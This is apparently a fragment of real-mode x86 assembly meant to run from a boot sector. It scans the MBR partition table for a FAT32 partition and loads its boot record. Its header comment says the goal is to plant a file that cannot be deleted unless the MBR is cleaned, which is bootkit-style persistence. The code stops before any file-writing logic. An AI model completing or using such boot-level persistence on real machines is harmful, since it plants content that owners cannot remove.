;
;   This code tries to insert a file directly into a FAT32 filesystem.
;   Deleting this file using the filesystem will be impossible
;   Unless the MBR is cleaned.
;

[bits 16]
[org 0x800]

%define SECTOR_TWO_ADDR     0x800
%define NEW_MBR_ADDR        0x600
%define FAT32_VBR_ADDR      0x1000

%define MBR_PART_OFFSET         0x1be
%define PART_TYPE_OFFSET        0x2
%define PART_START_LBA_OFFSET   0x8

_start:
    pusha
    mov bx, NEW_MBR_ADDR + MBR_PART_OFFSET
    mov cx, 0x4

_scan_for_fat:
    mov al, BYTE [bx + PART_TYPE_OFFSET]
    cmp al, 0xb
    jz _load_fat_vbr
    add bx, 0x10
    dec cx
    jz _no_part_handler
    jmp _scan_for_fat

_load_fat_vbr:
    call _reset_disk

    mov esi, DWORD [bx + PART_START_LBA_OFFSET]

    push esi
    push DWORD 0x0



_end:
    popa
    ret

_reset_disk:
    mov ah, 0x0
    int 0x13                    ; reset the disk
    jc _disk_io_error
    ret

_read_sector_chs:
    mov ah, 0x2
    int 0x13
    jc _disk_io_error
    ret

_read_sector_lba:
    mov ah, 0x42
    int 0x13
    jc _disk_io_error
    ret

_no_part_handler:
    mov si, no_fat_found_msg
    call _print_str
    jmp _end_loop

_print_str:
    lodsb
    or al, al               ; did we reach a null byte?
    jz _print_end
    mov ah, 0xe
    int 0x10
    jmp _print_str

_print_end:
    ret

_end_loop:                  ; after printing an error, we should just loop forever
    jmp _end_loop

no_fat_found_msg: db "No fat partition found!", 0x00
